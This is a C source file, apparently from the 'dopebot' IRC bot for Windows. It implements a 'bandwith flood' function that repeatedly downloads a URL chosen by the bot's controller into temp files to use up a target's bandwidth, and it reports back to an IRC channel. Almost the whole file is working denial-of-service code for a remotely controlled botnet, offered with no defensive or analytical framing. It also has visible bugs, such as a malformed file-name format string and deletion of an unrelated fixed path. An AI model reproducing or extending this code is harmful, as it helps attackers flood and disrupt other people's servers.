/*	dopebot - a modular IRC bot for Win32
	Copyright (C) 2004 dope

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

#ifndef NO_DOWNLOAD
#ifndef NO_BANDWITH
#include "..\Bot\bot.h"

//Download File
DWORD WINAPI bandwithflood(LPVOID param)
{
	bandwith dbn = *((bandwith *)param);
	char szFile[MAX_PATH], szTempDir[MAX_PATH];
	int i;

#ifndef NO_DEBUG
		printf("[DEBUG] Starting bandwith flood, bandwithflood()\n");
#endif

			GetTempPath(sizeof(szTempDir), szTempDir);
	for (i = 1; i < dbn.iDelay; i++)
	{
			srand(GetTickCount());
			sprintf(szFile, "%s\\i%.tmp", szTempDir, rand()%9999);
		if (xURLDownloadToFile(dbn.szUrl, szFile) != S_OK)
		{
				irc_msg(dbn.bsock, dbn.szAction, dbn.szChannel, "[BANDWITHFLOOD] bad address or dns.");
				return 0;
		}
		else DeleteFile("C:\\temp.tmp");
	}
		return 0;
}
#endif
#endif